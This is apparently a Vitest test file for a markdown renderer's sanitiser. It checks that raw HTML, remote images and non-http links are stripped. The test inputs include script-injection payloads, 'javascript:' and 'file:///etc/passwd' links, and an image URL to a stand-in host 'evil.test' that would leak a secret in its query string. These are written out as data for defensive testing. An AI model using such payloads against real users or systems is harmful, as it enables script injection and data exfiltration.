import { describe, expect, it } from 'vitest';
import { renderMarkdown, safeHref } from '../src/markdown.js';

const dom = (html: string) => {
  const d = document.createElement('div');
  d.innerHTML = html;
  return d;
};

describe('markdown', () => {
  it('no_raw_html_rendered', () => {
    const out = renderMarkdown(
      'hi <script>alert(1)</script> <b onclick="x()">bold</b>\n\n<iframe src="https://evil.test"></iframe>\n\n<button data-copy>forged</button>',
    );
    const d = dom(out);
    expect(d.querySelector('script, iframe, b')).toBeNull();
    // The forged button is text, not an element.
    expect(d.querySelector('button')).toBeNull();
    expect(d.textContent).toContain('<script>alert(1)</script>');
    expect(d.textContent).toContain('<b onclick="x()">');
  });

  it('no_remote_images_rendered', () => {
    const out = renderMarkdown(
      '![secret exfil](https://evil.test/p.png?d=SECRET) and ![](http://evil.test/a.gif)\n\n<img src="https://evil.test/x.png">\n\n[ref]: https://evil.test/r.png\n![viaref][ref]',
    );
    const d = dom(out);
    expect(d.querySelector('img')).toBeNull();
    expect(out).not.toContain('evil.test/p.png');
    expect(out).not.toContain('evil.test/a.gif');
    expect(out).not.toContain('evil.test/r.png');
    // Alt text stays visible.
    expect(d.textContent).toContain('secret exfil');
  });

  it('keeps only http and https links', () => {
    const d = dom(
      renderMarkdown(
        '[a](https://example.com/x) [b](javascript:alert(1)) [c](file:///etc/passwd) [d](data:text/html,x) [e](/relative)',
      ),
    );
    const links = [...d.querySelectorAll('a')].map((a) => a.getAttribute('href'));
    expect(links).toEqual(['https://example.com/x']);
    expect(d.textContent).toContain('b');
    expect(d.querySelector('a')?.getAttribute('rel')).toBe('noopener noreferrer');
    expect(safeHref('HTTP://x.test')).toBe('http://x.test/');
    expect(safeHref('mailto:a@b.c')).toBeUndefined();
  });

  it('renders code blocks with a copy button, tables and lists', () => {
    const d = dom(
      renderMarkdown('```sql\nSELECT 1 < 2\n```\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n- x\n- y'),
    );
    expect(d.querySelector('button[data-copy]')).not.toBeNull();
    expect(d.querySelector('pre code')?.textContent).toBe('SELECT 1 < 2');
    expect(d.querySelectorAll('td')).toHaveLength(2);
    expect(d.querySelectorAll('li')).toHaveLength(2);
  });
});
